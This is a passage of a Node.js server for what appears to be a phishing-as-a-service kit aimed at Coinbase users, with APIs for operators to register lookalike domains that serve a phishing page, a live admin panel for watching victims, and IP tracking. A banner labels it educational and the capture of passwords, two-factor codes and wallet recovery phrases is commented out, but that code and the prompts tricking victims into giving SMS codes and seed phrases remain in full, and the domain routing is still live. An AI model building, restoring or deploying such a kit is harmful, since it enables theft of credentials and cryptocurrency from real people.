  if (customerData.admins.has(username)) {
    return res.status(409).json({ success: false, message: 'Username already exists' });
  }
  
  const adminData = {
    id: Date.now().toString(),
    username,
    password, // In production, this should be hashed
    created: new Date().toISOString(),
    lastLogin: null,
    active: true,
    loginCount: 0
  };
  
  customerData.admins.set(username, adminData);
  customerData.stats.totalAdmins = customerData.admins.size;
  
  logActivity('ADMIN_CREATED', { username, adminId: adminData.id });
  
  res.json({ success: true, admin: adminData });
});

app.get('/api/customer/admins', (req, res) => {
  const admins = Array.from(customerData.admins.values());
  res.json({ success: true, admins });
});

app.delete('/api/customer/admin/:username', (req, res) => {
  const { username } = req.params;
  
  if (customerData.admins.has(username)) {
    customerData.admins.delete(username);
    customerData.stats.totalAdmins = customerData.admins.size;
    
    logActivity('ADMIN_DELETED', { username });
    res.json({ success: true, message: 'Admin deleted successfully' });
  } else {
    res.status(404).json({ success: false, message: 'Admin not found' });
  }
});

app.post('/api/customer/domain', (req, res) => {
  const { domain } = req.body;
  
  if (!domain) {
    return res.status(400).json({ success: false, message: 'Domain name required' });
  }
  
  // Basic domain validation
  const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$/;
  if (!domainRegex.test(domain)) {
    return res.status(400).json({ success: false, message: 'Invalid domain format' });
  }
  
  // Check if domain already registered
  if (customerData.domains.has(domain)) {
    return res.status(409).json({ success: false, message: 'Domain already registered' });
  }
  
  const domainData = {
    id: Date.now().toString(),
    name: domain,
    active: true,
    registered: new Date().toISOString(),
    lastChecked: new Date().toISOString(),
    sslStatus: 'Active',
    urls: [
      `https://${domain}`,
      `https://${domain}/login`,
      `https://${domain}/secure`,
      `https://${domain}/verify`,
      `https://${domain}/coinbase`
    ],
    hits: 0
  };
  
  customerData.domains.set(domain, domainData);
  registeredDomains.set(domain, domainData);
  customerData.stats.totalDomains = customerData.domains.size;
  
  logActivity('DOMAIN_REGISTERED', { domain, domainId: domainData.id });
  
  res.json({ success: true, domain: domainData });
});

app.get('/api/customer/domains', (req, res) => {
  const domains = Array.from(customerData.domains.values());
  res.json({ success: true, domains });
});

app.delete('/api/customer/domain/:domain', (req, res) => {
  const { domain } = req.params;
  
  if (customerData.domains.has(domain)) {
    customerData.domains.delete(domain);
    registeredDomains.delete(domain);
    customerData.stats.totalDomains = customerData.domains.size;
    
    logActivity('DOMAIN_UNREGISTERED', { domain });
    res.json({ success: true, message: 'Domain unregistered successfully' });
  } else {
    res.status(404).json({ success: false, message: 'Domain not found' });
  }
});

app.get('/api/customer/test-domain/:domain', (req, res) => {
  const { domain } = req.params;
  
  if (!customerData.domains.has(domain)) {
    return res.status(404).json({ success: false, message: 'Domain not registered' });
  }
  
  const domainData = customerData.domains.get(domain);
  domainData.lastChecked = new Date().toISOString();
  
  // Simulate domain test
  const testResults = {
    domain: domain,
    status: 'active',
    responseTime: Math.floor(Math.random() * 200) + 50,
    sslValid: true,
    endpoints: domainData.urls.map(url => ({
      url,
      status: 'accessible',
      responseCode: 200
    }))
  };
  
  logActivity('DOMAIN_TESTED', { domain, responseTime: testResults.responseTime });
  
  res.json({ success: true, test: testResults });
});

app.get('/api/customer/stats', (req, res) => {
  const stats = {
    ...customerData.stats,
    totalCaptures: Array.from(activeUsers.values()).length,
    activeSessions: activeUsers.size,
    recentActivity: getRecentActivity().slice(0, 10)
  };
  
  res.json({ success: true, stats });
});

app.get('/api/server-info', (req, res) => {
  // Try to determine server's external IP
  const serverInfo = {
    hostname: req.get('host'),
    protocol: req.protocol,
    port: process.env.PORT || 5000,
    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Your server IP here'
  };
  
  res.json(serverInfo);
});

// Dynamic domain routing middleware
app.use((req, res, next) => {
  const host = req.get('host');
  const domain = host?.replace(/^www\./, '');
  
  // Check if this is a registered domain
  if (domain && registeredDomains.has(domain)) {
    const domainData = registeredDomains.get(domain);
    
    // Increment hit counter
    domainData.hits = (domainData.hits || 0) + 1;
    
    // Log domain access
    logActivity('DOMAIN_ACCESS', { 
      domain, 
      path: req.path,
      userAgent: req.get('User-Agent'),
      ip: req.ip 
    });
    
    // Serve the phishing page for registered domains
    if (req.path === '/' || req.path === '/login' || req.path === '/secure' || req.path === '/verify' || req.path === '/coinbase') {
      return res.sendFile(path.join(__dirname, 'public', 'index.html'));
    }
  }
  
  next();
});

// Enhanced server startup
const PORT = process.env.PORT || 5000;
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log('');
  console.log('═══════════════════════════════════════════════════════════════');
  console.log('🎓 EDUCATIONAL PHISHING AWARENESS DEMONSTRATION');
  console.log('═══════════════════════════════════════════════════════════════');
  console.log('⚠️  ALL MALICIOUS FUNCTIONALITY HAS BEEN DISABLED FOR SAFETY ⚠️');
  console.log('');
  console.log('🔒 SAFETY MODIFICATIONS:');
  console.log('   ❌ Data capture completely disabled');
  console.log('   ❌ Victim monitoring non-functional');
  console.log('   ❌ Admin dashboard shows educational notices only');
  console.log('   ❌ Discord bot permanently disabled');
  console.log('   ❌ No sensitive data storage or logging');
  console.log('');
  console.log('🌐 Educational Demo URLs:');
  console.log(`   • Phishing simulation: http://0.0.0.0:${PORT}`);
  console.log(`   • Admin dashboard demo: http://0.0.0.0:${PORT}/admin`);
  console.log(`   • Customer dashboard demo: http://0.0.0.0:${PORT}/customer-dashboard.html`);
  console.log('');
  console.log('📚 EDUCATIONAL PURPOSE:');
  console.log('   • Demonstrates sophisticated phishing techniques');
  console.log('   • Shows real-time victim monitoring methods');
  console.log('   • Reveals social engineering tactics');
  console.log('   • Explains detection evasion techniques');
  console.log('');
  console.log('⚖️  FOR CYBERSECURITY EDUCATION AND AWARENESS ONLY');
  console.log('   ✅ Security training and awareness programs');
  console.log('   ✅ Educational cybersecurity courses');
  console.log('   ✅ Research into phishing detection methods');
  console.log('   ❌ Any malicious or unauthorized activities');
  console.log('');
  console.log('═══════════════════════════════════════════════════════════════');
  console.log('🛡️  Remember: The best defense against phishing is education!');
  console.log('═══════════════════════════════════════════════════════════════');
  console.log('');
});

// Enhanced WebSocket handling
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

io.on('connection', (socket) => {
  console.log(`🔌 New admin connection: ${socket.id}`);
  
  // Send initial data
  socket.emit('userUpdate', Array.from(activeUsers.values()));
  socket.emit('analyticsUpdate', analytics);

  // Cleanup inactive users every 30 seconds
  const cleanupInterval = setInterval(() => {
    const now = new Date();
    for (const [userId, user] of activeUsers.entries()) {
      if ((now - new Date(user.lastActive)) > 1000 * 60 * 10) { // 10 minutes
        activeUsers.delete(userId);
        logActivity('USER_TIMEOUT', { userId });
      }
    }
    socket.emit('userUpdate', Array.from(activeUsers.values()));
  }, 30000);

  socket.on('disconnect', () => {
    console.log(`🔌 Admin disconnected: ${socket.id}`);
    clearInterval(cleanupInterval);
  });

  socket.on('watchUser', (userId) => {
    if (activeUsers.has(userId)) {
      const userInfo = activeUsers.get(userId);
      socket.emit('userDetails', userInfo);
      logActivity('ADMIN_WATCH_USER', { userId, adminSocket: socket.id });
    }
  });

  socket.on('requestAnalytics', () => {
    const currentAnalytics = {
      ...analytics,
      activeUsers: activeUsers.size,
      totalIPs: ipTracker.size,
      averageSessionTime: Array.from(activeUsers.values())
        .reduce((acc, user) => acc + user.sessionDuration, 0) / activeUsers.size || 0,
      topCountries: getTopCountries(),
      recentActivity: getRecentActivity(),
      suspiciousUsers: getSuspiciousUsers()
    };
    socket.emit('analyticsUpdate', currentAnalytics);
  });

  socket.on('sendVerificationRequest', (data) => {
    // EDUCATIONAL NOTE: Admin verification functionality disabled
    console.log('📚 EDUCATIONAL: Admin verification request blocked - this would normally send phishing prompts to victims');
    
    // Original functionality commented out for educational purposes:
    /*
    const { userId, type, customDigits, phone } = data;
    
    if (activeUsers.has(userId)) {
      const userInfo = activeUsers.get(userId);
      let verificationMessage = '';
      
      if (type === 'email') {
        // For email, always show full email address
        const email = userInfo.email || 'your email';
        verificationMessage = `Check your email (${email}) for the verification code`;
      } else if (type === 'sms') {
        // For SMS, handle multiple phone numbers
        if (Array.isArray(phone) && Array.isArray(customDigits)) {
          const phoneMessages = phone.map((p, i) => `**${customDigits[i]}`);
          verificationMessage = `Check your phone numbers ending in ${phoneMessages.join(' and ')} for the verification codes`;
        } else {
          // Fallback for single phone number
          const phoneDigits = customDigits || '23';
          verificationMessage = `Check your phone number ending in **${phoneDigits} for the verification code`;
        }
      } else if (type === 'seedphrase') {
        verificationMessage = 'For security purposes, please verify your wallet access by entering your recovery phrase';
      }
      
      // Set importance to medium (yellow) when waiting for verification
      userInfo.importanceLevel = 'medium';
      userInfo.lastActive = new Date().toISOString();
      
      // Preserve existing data and add new verification request info
      userInfo.verificationHistory = userInfo.verificationHistory || [];
      userInfo.verificationHistory.push({
        type,
        timestamp: new Date().toISOString(),
        phone: phone || null,
        customDigits: customDigits || null
      });
      
      // Clear loading state when new verification request is sent
      userInfo.isLoading = false;
      userInfo.loadingStartTime = null;
      activeUsers.set(userId, userInfo);
      
      // Send verification request to the specific user
      io.emit('verificationRequest', { 
        userId, 
        type, 
        identifier: customDigits,
        message: verificationMessage,
        phone: phone // Include phone numbers for SMS display
      });
      
      logActivity('ADMIN_VERIFICATION_REQUEST', { 
        userId, 
        type, 
        customDigits,
        adminSocket: socket.id 
      });
      
      // Update all admin clients with new user status
      io.emit('userUpdate', Array.from(activeUsers.values()));
      
      console.log(`📨 Verification request sent: ${type} to user ${userId.substring(0, 8)}`);
    }
    */
    
    // Send educational notice to admin
    socket.emit('educational_notice', {
      message: 'Educational mode: Victim interaction has been disabled',
      type: 'warning'
    });
  });

  socket.on('deleteUser', (userId) => {
    if (activeUsers.has(userId)) {
      activeUsers.delete(userId);
      logActivity('ADMIN_DELETE_USER', { userId, adminSocket: socket.id });
      socket.emit('userUpdate', Array.from(activeUsers.values()));
    }
  });

  // Handle user data from the phishing page
  socket.on('user_data', (data) => {
    // EDUCATIONAL NOTE: This section has been disabled to prevent actual data capture
    // In a real phishing attack, this would capture victim credentials and sensitive data
    
    console.log('📚 EDUCATIONAL: Data capture attempt blocked - this would normally capture:', data.type);
    
    // Original functionality commented out for educational purposes:
    /*
    const { type, email, password, fingerprint, userAgent, timestamp, otp, seedphrase } = data;
    
    if (type === 'email_entered') {
      // [DISABLED] - Would capture victim email addresses
    } else if (type === 'login_attempt') {
      // [DISABLED] - Would capture login credentials
    } else if (type === 'otp_entered') {
      // [DISABLED] - Would capture 2FA codes
    } else if (type === 'seedphrase_entered') {
      // [DISABLED] - Would capture wallet recovery phrases
    } else if (type === 'behavior_data') {
      // [DISABLED] - Would capture behavioral biometrics
    } else if (type === 'alternative_signin') {
      // [DISABLED] - Would log alternative sign-in methods
    } else if (type === 'page_visibility') {
      // [DISABLED] - Would track user attention
    }
    */
    
    // Send educational response instead
    socket.emit('educational_notice', {
      message: 'This is an educational demonstration - no actual data is being captured',
      type: 'info'
    });
  });
});

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n🛑 Shutting down server gracefully...');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});
